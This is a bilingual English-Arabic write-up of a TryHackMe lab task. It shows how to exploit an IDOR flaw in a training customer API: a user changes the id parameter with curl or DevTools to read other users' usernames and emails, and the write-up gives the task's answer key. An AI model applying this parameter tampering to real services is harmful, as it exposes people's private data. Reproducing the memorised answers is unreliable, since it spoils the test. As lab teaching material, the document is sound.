# Task 07 · A Practical IDOR Example (التطبيق العملي: استغلال ثغرة IDOR في واجهات البرمجة الخلفية)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

In this practical challenge, we execute a real-world IDOR exploitation workflow against the customer management API of the **Acme IT Support** portal.

### Target Environment & Workflow:
1. Access the target application at `https://LAB_WEB_URL.p.thmlabs.com`.
2. Register a new user account under the **Customers** section and log in.
3. Navigate to the **Your Account** page, which renders the user's username, email address, and password change options.
4. Using browser developer tools (or an intercepting proxy like Burp Suite), identify the background API call responsible for populating the account details.
5. Identify the direct object reference parameter governing the JSON response.
6. Tamper with the parameter to extract the confidential profile data of User ID `1` and User ID `3`.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والاعتبارات الأمنية والعملياتية)

1. **API Parameter Decoupling:**
   - In modern architectures, frontend Single Page Applications (SPAs) often decouple UI rendering from data retrieval. The HTML page loads as a static shell, followed by an immediate API request:
     `GET /api/v1/customer?id=13`
   - If the backend API assumes that "only the legitimate user will pass their own ID," it creates an immediate IDOR vulnerability.
2. **Replay Mechanisms:**
   - Testers can replay and modify API requests using:
     - Browser DevTools: Right-click request -> **Edit and Resend** (Firefox) or **Replay XHR** (Chrome).
     - Burp Suite: Send request to **Repeater** (`Ctrl + R`).
     - Command-line: Copy as cURL command.

---

## Stage C: Guided Hints (توجيهات تدريجية بدون حرق الإجابة)

- **Hint for Question 1:** Open Network tab in Developer Tools, locate the request to `/api/v1/customer?id=...`. Change `id=...` to `id=1`. View the returned JSON object and look for the value of the `username` field.
- **Hint for Question 2:** Change the parameter from `id=1` to `id=3`. Inspect the JSON response and copy the value of the `email` key.

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتحليل التقني)

### Step 1: Account Provisioning & Traffic Capture

1. In the target browser, navigate to:
   ```
   https://LAB_URL.p.thmlabs.com/customers/signup
   ```
2. Register an account (e.g., username `pentester101`, email `test@thm.com`, password `Password123!`).
3. Log in and navigate to the **Your Account** section.
4. Press `F12` to open Developer Tools and select the **Network** tab.
5. Refresh the page (`Ctrl + F5` or `F5`).

---

### Step 2: Isolating the Vulnerable Background API Request

Inspect the list of HTTP requests. You will observe an asynchronous GET request:
```http
GET /api/v1/customer?id=13 HTTP/1.1
Host: LAB_URL.p.thmlabs.com
User-Agent: Mozilla/5.0 ...
Cookie: session=eyJhY2NvdW50X2lkIjoxM30...
Accept: application/json
```

Inspecting the Response body reveals:
```json
{
  "id": 13,
  "username": "pentester101",
  "email": "test@thm.com"
}
```

The server returns data governed strictly by the `id` query parameter!

---

### Step 3: Exploiting IDOR to Audit User ID 1

1. Modify the request using Developer Tools ("Edit and Resend") or via `curl`:
   ```bash
   curl -s "https://LAB_URL.p.thmlabs.com/api/v1/customer?id=1" \
        -H "Cookie: session=eyJhY2NvdW50X2lkIjoxM30..."
   ```

2. The server processes the request without authorization checks and responds:
   ```json
   {
     "id": 1,
     "username": "adam84",
     "email": "adam@fakemail.thm"
   }
   ```
   - **Target 1 Username:** `adam84`

---

### Step 4: Exploiting IDOR to Audit User ID 3

1. Modify the `id` parameter to `3`:
   ```bash
   curl -s "https://LAB_URL.p.thmlabs.com/api/v1/customer?id=3" \
        -H "Cookie: session=eyJhY2NvdW50X2lkIjoxM30..."
   ```

2. The server responds with User 3's confidential record:
   ```json
   {
     "id": 3,
     "username": "john",
     "email": "j@fakemail.thm"
   }
   ```
   - **Target 3 Email:** `j@fakemail.thm`

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question 1:** *What is the username for user id 1?*
  - **Answer:** `adam84`
- **Question 2:** *What is the email address for user id 3?*
  - **Answer:** `j@fakemail.thm`

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- Both answers (`adam84` and `j@fakemail.thm`) submitted and accepted by the TryHackMe platform validation engine.
- Complete API request/response JSON payloads verified.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

> **قاعدة ذهبية:** تُظهر واجهات البرمجة الخلفية الحديثة (`REST APIs`) هشاشة أمنية بالغة عندما تعتمد على معاملات رقمية صريحة (`/api/v1/customer?id=X`) لجلب البيانات؛ فالحماية الحقيقية تقتضي ألا يقبل الخادم معرّف الحساب كمعامل خارجي قابل للتعديل، بل يجب أن يستنتجه داخلياً من هوية الجلسة المشفرة (`Session Context`)، أو يتحقق من وجود علاقة ملكية معتمدة في قاعدة البيانات قبل إرجاع أي كائن.
